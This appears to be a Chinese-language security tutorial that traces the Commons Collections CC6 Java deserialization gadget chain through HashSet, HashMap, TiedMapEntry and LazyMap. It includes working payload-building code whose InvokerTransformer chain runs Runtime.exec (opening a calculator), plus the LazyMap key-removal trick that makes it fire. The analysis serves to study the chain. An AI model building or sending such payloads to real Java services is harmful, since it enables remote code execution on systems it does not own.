CC6相比于CC1，解决的是jdk版本问题，因为在jdk8u71以后，AnnotationInvocationHandler的readObject发生了改变，导致CC1在jdk8u71以后的版本无法使用，而CC6没有jdk版本限制，只要Commons-Collections小于等于3.2.1就能用。

先来看下CC6的利用链：
```java
java.io.ObjectInputStream.readObject()
    java.util.HashSet.readObject()
        java.util.HashMap.put()
        java.util.HashMap.hash()
            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                org.apache.commons.collections.map.LazyMap.get()  // 从这里开始，跟CC1都是一样的。
                    org.apache.commons.collections.functors.ChainedTransformer.transform()
                    org.apache.commons.collections.functors.InvokerTransformer.transform()
                    java.lang.reflect.Method.invoke()
                        java.lang.Runtime.exec()
```
我们从TiedMapEntry.getValue开始看，他调用了get方法：
```java
public Object getValue() {
    return this.map.get(this.key);
}
```
这里很好理解，this.map为LazyMap即可。

接着往上看TiedMapEntry.hashCode：
```java
public int hashCode() {
    Object value = this.getValue(); // 在这里
    return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
}
```
不多说，继续往上看HashMap，可以看到put调用了hash，这个很简单，HashMap是数组➕链表的结构，其中key处于数组中的Node中，
```java
transient Node<K,V>[] table;
```
Node就是HashMap中的一个内部类，继承自Entry：
```java
static class Node<K,V> implements Map.Entry<K,V> {
    final int hash;
    final K key;
    V value;
    Node<K,V> next;

    Node(int hash, K key, V value, Node<K,V> next) {
        this.hash = hash;
        this.key = key;
        this.value = value;
        this.next = next;
    }
    ...
}
```

value处于数组中Node对应的链表中，每次调用put即为新增元素，hashMap会调用hash也即hashCode来计算hash。

代码如下：
```java
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}

static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

接下来再看HashSet的readObject：
```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in any hidden serialization magic
    s.defaultReadObject();

    // Read capacity and verify non-negative.
    int capacity = s.readInt();
    if (capacity < 0) {
        throw new InvalidObjectException("Illegal capacity: " +
                                            capacity);
    }

    // Read load factor and verify positive and non NaN.
    float loadFactor = s.readFloat();
    if (loadFactor <= 0 || Float.isNaN(loadFactor)) {
        throw new InvalidObjectException("Illegal load factor: " +
                                            loadFactor);
    }

    // Read size and verify non-negative.
    int size = s.readInt();
    if (size < 0) {
        throw new InvalidObjectException("Illegal size: " +
                                            size);
    }

    // Set the capacity according to the size and load factor ensuring that
    // the HashMap is at least 25% full but clamping to maximum capacity.
    capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f),
            HashMap.MAXIMUM_CAPACITY);

    // 这里之所以会做一个LinkedHashSet判断，是因为LinkedhashSet继承自HashSet，不用管，回头直接创建HashSet就好了
    map = (((HashSet<?>)this) instanceof LinkedHashSet ?
            new LinkedHashMap<E,Object>(capacity, loadFactor) :
            new HashMap<E,Object>(capacity, loadFactor));

    // Read in all elements in the proper order.
    for (int i=0; i<size; i++) {
        @SuppressWarnings("unchecked")
            E e = (E) s.readObject();
        map.put(e, PRESENT);  // 这里调用put方法
    }
}
```

到这里可以看到CC6本质上只是在AnnotationInvocationHandler无法使用以后重新找了一条利用路径。

有了上面的铺垫，我们就可以轻松构造payload，首先创建一个HashSet，然后put一个TiedMapEntry对象进去，value随意，然后将其this.map设为LazyMap对象，这个LazyMap对象的this.factory应该是恶意ChainedTransformer：
```java
Transformer[] fakeTransformers = {new ConstantTransformer(1)};
Transformer[] transformers = {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"}),
        new ConstantTransformer(1)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
HashMap hashMap = new HashMap();
Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, 1);

HashSet hashSet = new HashSet();
hashSet.add(tiedMapEntry);

Field iTransformers = chainedTransformer.getClass().getDeclaredField("iTransformers");
iTransformers.setAccessible(true);
Field modifiers = iTransformers.getClass().getDeclaredField("modifiers");
modifiers.setAccessible(true);
modifiers.setInt(iTransformers,iTransformers.getModifiers()& ~Modifier.FINAL);
iTransformers.set(chainedTransformer,transformers);
```
但这样的hashSet我们拿去反序列化时却发现无法执行命令，这时调试就会发现，在LazyMap.get方法中对key进行校验，只有当this.map中不存在这个key时，才会进一步调用this.factory.transform：
```java
public Object get(Object key) {
    if (!this.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        this.map.put(key, value);
        return value;
    } else {
        return this.map.get(key);
    }
}
```
这时候我们会产生疑惑，在我们创建TiedMapEntry时，确实定义了key，但为什么会影响到LazyMap？实际上，在创建TiedMapEntry时：
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, 1);
就会自动执行了类似：`this.map.put(key,value)`，这很难解释，我尝试调试，始终无法捕获这关键的瞬间。
不过，我们可以做一个简单的实验来证明，首先创建一个lazyMap
```java
Map lazymap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
lazymap.get(1);
lazymap.get(1);
```
我们把LazyMap#get下断点，然后调试，会发现，在第一次get的时候，this.map为空，因此会进入if逻辑，于是执行this.map.put，等到第二次get的时候，就直接进入else逻辑了。这很符合逻辑。
接下来再写一个demo：
```java
Map lazymap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, 1);
lazymap.get(1);
```
还是对`LazyMap#get`下断点，这时我们调试会发现，`new TiedMapEntry`并没有触发任何断点，但在lazymap.get的时候，this.map已经不为空了，仿佛是某种隐式的调用。

P牛在《java安全漫谈-12》中提到这个事情，他的解释是因为HashSet在add时会调用LazyMap#get，是这样的，调用链如下：
```java
HashSet#add()
    -> HashMap#put() -> hash() 
        -> TiedMapEntry#hashCode() -> getValue()
            -> LazyMap#get()
```

因此实际上，在序列化前，`LazyMap#get`就会被调用两次，一次是实例化TiedMapEntry时的隐式调用，一次是`HashSet#add`时的正常调用。这两次都避免不了。

get只要被调用，就会将key写入`this.map`。如果不处理，反序列化时，就不会调用`this.factory.transform`了。

索性解决办法很简单，直接从lazyMap中remove这个键值对即可：
```java
lazyMap.remove(1);
```

到这里分析完毕，完整代码见于`GenCC6.java``

